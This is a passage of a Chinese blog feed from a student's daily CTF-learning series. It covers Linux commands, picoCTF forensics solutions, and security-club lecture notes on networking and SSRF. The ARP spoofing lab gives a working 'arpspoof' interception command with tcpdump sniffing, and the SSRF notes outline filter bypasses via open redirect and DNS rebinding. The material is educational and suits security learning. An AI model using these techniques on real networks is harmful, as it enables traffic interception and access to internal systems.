顯示詳細資訊</li><li><code>f</code>: 檔案名稱</li><li><code>c</code>: 建立壓縮檔</li><li><code>j</code>: 用 bzip2 壓縮</li><li><code>z</code>: 用 gzip 壓縮</li><li><code>J</code>: 用 xz 壓縮</li><li><code>x</code>: 解壓縮</li><li><code>tar -cvf xxx.tar xxx</code>: 壓縮</li><li><code>tar -xvf xxx.tar</code>: 解壓縮</li><li><code>tar -zcvf xxx.tar.gz xxx</code>: 壓縮成 .tar.gz</li><li><code>tar -zxvf xxx.tar.gz</code>: 解壓縮 .tar.gz</li></ul></li><li>pipe: <code>|</code>，把前面的結果傳給後面<ul><li>例如 <code>ls | grep xxx</code> 就是把 <code>ls</code> 的結果傳給<code>grep</code> 來找 <code>xxx</code></li></ul></li><li><code>sleep</code>: 會暫停後面接的秒數</li><li>一些特殊 combo<ul><li><code>Ctrl+C</code>: 中斷目前的指令</li><li><code>Ctrl+Z</code>: 暫停目前的指令 (suspended)<ul><li><code>jobs</code>: 查看暫停的指令</li><li><code>fg</code>: 把暫停的指令恢復 (利用 <code>%{number}</code>來指定要恢復 jobs 中指令的編號)</li><li><code>bg</code>: 把暫停的指令變成背景執行</li></ul></li><li><code>Ctrl+D</code>: EOF</li></ul></li><li>redirect:<code>&gt;</code>，把前面的結果寫到後面的檔案，<code>&gt;&gt;</code> 是append， <code>&lt;</code> 是把檔案的內容傳給後面的指令<ul><li><code>ls &gt; xxx.txt</code> 就是把 <code>ls</code> 的結果寫到<code>xxx.txt</code></li><li><code>ls &gt;&gt; xxx.txt</code> 就是把 <code>ls</code> 的結果append 到 <code>xxx.txt</code></li><li><code>cat &lt; xxx.txt</code> 就是把 <code>xxx.txt</code> 的內容傳給<code>cat</code></li><li><code>2&gt;</code> 是把錯誤訊息寫到檔案</li></ul></li><li>regex<ul><li>可以在 <a href="https://regexlearn.com/">regexlearn</a> 學</li><li>在 <a href="https://regex101.com/">regex101</a> 測試</li><li><code>.</code>: 任意字元</li><li><code>*</code>: 0 到無限多次</li><li><code>+</code>: 1 到無限多次</li><li><code>[abc]</code>: a, b, c 任一個</li><li><code>[^abc]</code>: 除了 a, b, c 之外</li><li><code>[a-z]</code>: a 到 z 之間</li></ul></li><li><code>sed</code>: stream editor 有點複雜，會用到的時候再查就好</li><li><code>grep</code>: global regular expression print<ul><li><code>-i</code>: 不分大小寫</li><li><code>-v</code>: 反向選取</li><li><code>-n</code>: 顯示行數</li><li><code>-r</code>: 遞迴</li><li><code>-l</code>: 只顯示檔名</li><li><code>-c</code>: 只顯示數量</li><li><code>-e</code>: 多個條件</li><li><code>-E</code>: 正規表達式</li><li><code>-A</code>: 顯示後面幾行</li><li><code>-B</code>: 顯示前面幾行</li><li><code>-C</code>: 顯示前後幾行</li><li><code>grep xxx *</code>: 在所有檔案中找 <code>xxx</code></li></ul></li><li><code>find</code>: 找檔案</li><li>bash script<ul><li>就是用 <code>.sh</code> 結尾的檔案，然後裡面寫一些指令</li><li>然後在檔案裡面寫一些指令，<code>chmod</code>加執行權限就可以執行了</li></ul></li><li><code>crontab</code>: 定時執行<ul><li><code>crontab -e</code>: 編輯</li><li><code>crontab -l</code>: 列出</li><li><code>crontab -r</code>: 刪除</li><li><code>* * * * * xxx</code>: 分鐘 小時 日 月 星期幾 指令</li></ul></li><li>apt / mirror: 安裝套件<ul><li><code>apt update</code>: 更新套件</li><li><code>apt upgrade</code>: 升級套件 (順序會是先更新再升級)</li><li><code>apt install xxx</code>: 安裝套件</li><li><code>apt remove xxx</code>: 移除套件</li><li><code>apt search xxx</code>: 搜尋套件</li><li><code>apt list</code>: 列出所有套件</li><li><code>apt show xxx</code>: 顯示套件資訊</li><li><code>apt autoremove</code>: 移除不需要的套件</li><li><code>apt clean</code>: 清除快取</li><li><code>apt autoclean</code>: 清除舊的快取</li></ul></li><li><code>$()</code>: 會優先執行 <code>()</code>指令的標準輸出，當成前面的指令的參數<ul><li>例如 <code>echo $(ls)</code> 就是把 <code>ls</code> 的結果傳給<code>echo</code></li></ul></li><li><code>cut</code>: 切割<ul><li><code>-d</code>: 分隔符號</li><li><code>-f</code>: 第幾個</li><li><code>cut -d " " -f 1 xxx</code>: 以空格切割，取第一個</li></ul></li></ul><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】Linux
基礎指令與使用者管理&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day25</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day25/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day25/</id>
    <published>2024-09-27T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P - 完</a></label></li><li><label><input type="checkbox" checked=""> 2 題Forensics</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="第一題verify">第一題：Verify <a href="#第一題verify" class="headerlink"></a></h3><p>把每一個檔案都拿去 decrypt 一次，然後看有沒有正確的 hash 可以得到flag。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./files -type f -exec ./decrypt.sh {} \; 2&gt;/dev/null | grep "picoCTF"</span><br></pre></td></tr></tbody></table></figure><h3 id="第二題scan-surprise">第二題：Scan Surprise <a href="#第二題scan-surprise" class="headerlink"></a></h3><p>ssh 連進去之後會有個跳出一個 QR code，掃出來就是 flag 了</p><h2 id="上課記錄">上課記錄 <a href="#上課記錄" class="headerlink"></a></h2><p><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></p><h3 id="什麼是協定">什麼是協定 <a href="#什麼是協定" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/RSNrYo5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="http">HTTP <a href="#http" class="headerlink"></a></h4><blockquote><p>HTTP/2 之前的版本是一種建立在 TCP 上的傳輸協定。(HTTP/3例外，今天不提)<br>為何需要使用 TCP 是因為網頁他會需要可靠性的傳輸。</p></blockquote><figure><img data-src="https://i.imgur.com/ofobafe.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="request">Request <a href="#request" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/sPrrISD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>路徑就是想要檔案的位置</p><h5 id="response">Response <a href="#response" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/VRbe3Ws.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>status code:2 開頭成功，3 開頭重新導向，4 開頭客戶端錯誤，5 開頭伺服器錯誤</p><h5 id="http-lab">HTTP Lab <a href="#http-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/i7lPkRs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P1HGD39.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p><a href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Methods">HTTPMethod</a></p><h4 id="dns">DNS <a href="#dns" class="headerlink"></a></h4><blockquote><p>全名叫做 Domain Name System，是一種建立在 UDP 的協定。<br>主要用來查詢 Domain Name 的 IP Address 或是查詢 IP Address 對應的 DomainName。<br>那什麼是 Domain Name 呢？</p></blockquote><figure><img data-src="https://i.imgur.com/P1axnwy.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/63XpbUD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h5 id="dns-lab">DNS Lab <a href="#dns-lab" class="headerlink"></a></h5><figure><img data-src="https://i.imgur.com/ezlp25H.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/25rSqEN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】淺談網路與
H T T P - 完&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt; 2 題
Forensics&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day24</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day24/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day24/</id>
    <published>2024-09-26T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P - 到 NAT</a></label></li></ul><span id="more"></span><h2 id="淺談網路與-h-t-t-p">淺談網路與 H T T P <a href="#淺談網路與-h-t-t-p" class="headerlink"></a></h2><h3 id="什麼是網路">什麼是網路？ <a href="#什麼是網路" class="headerlink"></a></h3><p>簡單來說就是把很多台電腦用網路線或是 WIFI串連在一起就是所謂的網路了</p><p>可以比喻為一個送信的過程</p><ol type="1"><li>撰寫信件內容</li><li>放進信封決定要掛號還是平信，還有寄給誰</li><li>季見底止和收件地址</li><li>把信給郵局，然後轉發到其他郵局再送到收件人手上（如果你要送的人就在你家隔壁，你就直接給他就好了）</li></ol><p>網路也是一樣的概念，假設要去瀏覽 Google 這個網站</p><ol type="1"><li>Application layer (信件內容)<br><img data-src="https://i.imgur.com/TyrNoiL.png" alt="Image"></li><li>Transport layer (信封)<br><img data-src="https://i.imgur.com/Mh6F6Ru.png" alt="Image"></li><li>Network layer (寄件人和收件人)<br><img data-src="https://i.imgur.com/ctf7Io9.png" alt="Image"><br><img data-src="https://i.imgur.com/BJAtXDq.png" alt="Image"></li><li>Link layer (郵局)<br><img data-src="https://i.imgur.com/WjtMKGY.png" alt="Image"></li></ol><h3 id="什麼事-mac-address">什麼事 Mac Address <a href="#什麼事-mac-address" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/guXiiJc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>跟 IP 的差異是 IP 是可以變動的， Mac Address是固定的，所以在區域網路裡面是檢查 Mac Address 的，而不是 IP Address</p><p>在古代沒有 Switch 的時候， 適用 Hub 來連接多台電腦，但是 Hub是沒有腦袋的，他會把信送給所有人，每台電腦會檢查 Mac Address看那封信是不是寄給自己的，如果是就接收，如果不是就丟掉</p><figure><img data-src="https://i.imgur.com/r575Pbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>在有 Switch 後就只會把信送給對的人</p><figure><img data-src="https://i.imgur.com/TZKfGgs.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>但在我們瀏覽網頁是用 IP Address 來找到對方的，要找到對方的 MacAddress 就要用 ARP 協定</p><p><img data-src="https://i.imgur.com/NIA1F6B.png" alt="Image"><br><img data-src="https://i.imgur.com/R8bhGIW.png" alt="Image"></p><p>會有一個 ARP Table 來記錄對方的 MacAddress，固定一段時間後會清理和更新</p><p>會不會有資安問題？<br>會的，如果在我問目標的 Mac Address 時，有壞人騙我說他是目標的 MacAddress，這樣就會把信送給壞人，這就是 ARP Spoofing</p><figure><img data-src="https://i.imgur.com/3uRI4Kk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---arp-spoofing">Lab - ARP Spoofing <a href="#lab---arp-spoofing" class="headerlink"></a></h3><p>Lab 關掉了不能玩 😥</p><figure><img data-src="https://i.imgur.com/2dhPc7O.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -Ai eth1</span><br></pre></td></tr></tbody></table></figure><p>tcpdump 去聽封包的內容， <code>-A</code> 是把封包的內容顯示出來，<code>-i</code> 是指定網卡</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth1 -t 192.168.111.1 192.168.111.2</span><br></pre></td></tr></tbody></table></figure><p>這個指令就會幫你實作 ARP Spoofing 把 <code>192.168.111.1</code>要傳給 <code>192.168.111.2</code> 的封包攔截</p><figure><img data-src="https://i.imgur.com/zWABU43.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="什麼是網路---網段">什麼是網路 - 網段 <a href="#什麼是網路---網段" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/9Qut1Lg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上下最不同的是，上面的送的人是區域網路，下面的是送給區域外的人，所以他是要經過Router 來轉發的</p><p>一樣用寄信來比喻</p><figure><img data-src="https://i.imgur.com/yFWXbH2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ckCjpOt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上下最大的差異就是在區域內還是區域外，在網路內也是一樣的，要怎沒看是在區域內外等等會講</p><figure><img data-src="https://i.imgur.com/2u1JCbv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/xWRmV85.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>可以通過判斷目標 IP 是否是寄給 Default Gateway來判斷是區域內還是區域外</p><figure><img data-src="https://i.imgur.com/JfzeMAX.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>如何知道來源 IP 和目標 IP 是不是在同一個網段？</p><figure><img data-src="https://i.imgur.com/QC3dXek.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>把 Address 和 Netmask 的二進制做 AND 運算，就會是 Network ID，俗果兩個 Network ID 一樣就是在同一個網段 (所以如果 netmask 是<code>255.255.255.0</code> 的話其實就看 IP前九碼是不是都一樣就知道是不是在同區域，如果 netmask 是<code>255.255.0.0</code> 就看 IP 前六碼)</p><p><code>/24</code> 的意思 <code>255.255.255.0</code> 轉成二進制是<code>11111111.11111111.11111111.00000000</code> ，因為有 24 個1，就表示成 <code>/24</code></p><h3 id="什麼是網路---路由">什麼是網路 - 路由 <a href="#什麼是網路---路由" class="headerlink"></a></h3><p>資料送到 router 時， router 會根據上面的路由表傳送 packet，路由會根據他的路由地圖來決定要傳送給誰（就像我們可以利用 mtr看到我們資料是怎麼傳送目標的)</p><figure><img data-src="https://i.imgur.com/ARzYFfG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>上面這個就是路由表，如果是 192.168.20.5 就會通過 192.168.20.2出去</p><figure><img data-src="https://i.imgur.com/hg8FCbD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>router table 會以 netmask 最長的為優先</p><p>default gateway 就是 <code>0.0.0.0/0</code> 的縮寫，那如果沒有default gateway 就會找不到路徑，就會出現<code>Destination Host Unreachable</code></p><h3 id="tcp-vs-udp">TCP vs UDP <a href="#tcp-vs-udp" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/GzBbOug.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="udp">UDP <a href="#udp" class="headerlink"></a></h4><p>就是直接丟過去，不管有沒有真的收到</p><figure><img data-src="https://i.imgur.com/tdKM6ao.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="tcp">TCP <a href="#tcp" class="headerlink"></a></h4><p>如果需要可靠信傳送，要是資料很大用 UDP 傳過去可能就會很破碎，TCP就會每次都確認有沒有收到，有收到後才會傳下一個</p><figure><img data-src="https://i.imgur.com/MEndg57.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/Xj2Qrqw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9wLfeyg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RJqKk88.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>因為 TCP 的效能有點差，現在有一個叫做 QUIC 的協定，他是基於 UDP的，但是他有 TCP 的功能，所以效能會比較好</p><h3 id="port">Port <a href="#port" class="headerlink"></a></h3><p>因為一台電腦上有很多程式，所以要用 Port 來區分，每個服務都有自己的Port，像是 HTTP 預設是 80，HTTPS 是 443</p><h3 id="nat">NAT <a href="#nat" class="headerlink"></a></h3><p>現今 IPv4 最嚴重的問題，就是 IP 數量不夠用，因為 IP 最多就只有<code>2^32</code> 個，也就是 <code>4,294,967,296</code> 個，而且還有一些IP是不能用的，很明顯不可能讓地球上每個人都能用，這樣就會有些人沒有辦法用網路，所以就有兩個辦法</p><ol type="1"><li>換一個 IP 的協議: IPv6，但因為目前很多服務都是架在 IPv4上，大家也都還習慣用 IPv4，所以短期間就只能用下面那個方法</li><li>NAT: 既然我們 IP 不夠用，那就讓一些電腦有 IP 就好，其他電腦用假的IP<br><img data-src="https://i.imgur.com/kNC761j.png" alt="Image"><br><img data-src="https://i.imgur.com/mVPj0YS.png" alt="Image"><br>Router 會有一個 NAT Table 來記錄每個請求的 Source IP 和 DestinationIP，然後再把 Source IP 改成 Router 的IP，然後再把封包送出去，當對方回應時， Router 會根據 NAT Table把封包送到對應的電腦<br>但這樣還有個問題，如果有個 Server 架在 NAT後面，外面就戳不到，解決的方法就是 Port Forwarding<br><img data-src="https://i.imgur.com/DbLNxvt.png" alt="Image"><br><img data-src="https://i.imgur.com/Vr2qpuD.png" alt="Image"><br>會把外面送進拉的 Port 轉換成對應的內部 IP<br><a href="https://youtu.be/xleMUfUYbGw">How does NAT work</a></li></ol><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】淺談網路與
H T T P - 到 NAT&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day23</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day23/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day23/</id>
    <published>2024-09-25T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - 完</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="ssrf-server-side-request-forgery">SSRF (Server-Side RequestForgery) <a href="#ssrf-server-side-request-forgery" class="headerlink"></a></h3><ul><li>伺服器端請求偽造 (Server-Side Request Forgery)</li><li>繞過防火牆，存取內網設備</li><li>多數資料庫、 mail server 等機敏設備會選擇架在內網</li></ul><h4 id="先回看-url-的定義-rfc3986">先回看 url 的定義 rfc3986 <a href="#先回看-url-的定義-rfc3986" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/ljodqkf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KUwmy1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>對於 scheme 的利用</p><ol type="1"><li>本地<br><img data-src="https://i.imgur.com/rEcHVqA.png" alt="Image"></li><li>php 偽協議<br><img data-src="https://i.imgur.com/9K9Ymzg.png" alt="Image"></li></ol><h4 id="gopher">gopher <a href="#gopher" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/U0OVwny.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>但 gopher 這堂課不會詳細講道，之後再看</p><h4 id="檢查-authority-是否合法">檢查 authority 是否合法 <a href="#檢查-authority-是否合法" class="headerlink"></a></h4><p>目標: 成功存取內網的 ip 位置</p><p>可能被阻擋的方法</p><ol type="1"><li><p>黑名單<br><img data-src="https://i.imgur.com/y1QBoom.png" alt="Image"></p><ul><li><p>破解方法：<br><img data-src="https://i.imgur.com/ueyAIFd.png" alt="Image"><br><img data-src="https://i.imgur.com/KvMPbY1.png" alt="Image"><br><img data-src="https://i.imgur.com/MUD32zD.png" alt="Image"></p><p>利用 Domain 混淆<br><img data-src="https://i.imgur.com/sCh9gjp.png" alt="Image"></p></li></ul></li><li><p>白名單<br><img data-src="https://i.imgur.com/Wup4aoG.png" alt="Image"></p><ul><li><p>破解方法：</p><p>利用 Open Redirect<br><img data-src="https://i.imgur.com/3wYfCiz.png" alt="Image"><br><code>https://google.com/amp/moon-jam.me</code> 就會自動轉址到<code>moon-jam.me</code><br><img data-src="https://i.imgur.com/ZS9eYR1.png" alt="Image"></p></li></ul></li><li><p>DNS 解析後判斷是否合法<br><img data-src="https://i.imgur.com/GHpEr4K.png" alt="Image"></p><ul><li><p>破解方法：</p><p>利用 DNS Rebinding<br><img data-src="https://i.imgur.com/NOvLsSl.png" alt="Image"></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">製作 DNS Rebinding的網站</a></p><p>上一秒的時候解析是 <code>8.8.8.8</code> 所以不會被擋掉<br><img data-src="https://i.imgur.com/ak0NxJ5.png" alt="Image"></p><p>但下一秒的時候解析就變成 <code>127.0.0.1</code> 了，就能成功存取內網ip<br><img data-src="https://i.imgur.com/LIVN8Dd.png" 